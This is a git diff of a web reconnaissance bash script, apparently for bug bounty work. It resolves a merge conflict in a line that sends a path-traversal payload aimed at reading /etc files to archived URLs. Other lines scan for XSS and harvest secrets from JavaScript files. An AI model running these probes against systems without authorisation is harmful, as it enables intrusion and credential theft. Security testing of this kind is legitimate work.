@@ -13,11 +13,7 @@ cat gau_links/gau_compiled/gau_compiled.txt | grep -i "\.sql" | anew sensitive/s
 cat gau_links/gau_compiled/gau_compiled.txt | grep -i "\.bak" | anew sensitive/bak_found.txt
 cat gau_links/gau_compiled/gau_compiled.txt | grep -i "\.log" | anew sensitive/log_found.txt
 cat gau_links/gau_compiled/gau_compiled.txt | grep -i "=" | Gxss -c 100 | anew sensitive/xss.txt
-<<<<<<< HEAD
 cat gau_links/gau_compiled/gau_compiled.txt | grep -i "=" > sensitive/urls_to_test.txt; httpx -l sensitive/urls_to_test.txt -path "/////////../../../../../../../../etc/password" -status-code -mc 200 -ms 'root:'  | anew sensitive/anew lfi.txt
-=======
-cat gau_links/gau_compiled/gau_compiled.txt | grep -i "=" > sensitive/urls_to_test.txt; httpx -l sensitive/urls_to_test.txt -path "/////////../../../../../../../../etc/password" -status-code -mc 200 -m 'root:'  | anew sensitive/anew lfi.txt
->>>>>>> 7d31c76d509893a2f0f29a65e6a0e5489918e2e3
 cat gau_links/gau_compiled/gau_compiled.txt | grep -i "\.js$" > sensitive/jsfiles.txt; while read url; do python3 SecretFinder.py -i "$url";done<sensitive/jsfiles.txt | anew sensitive/secrets.txt
 
 
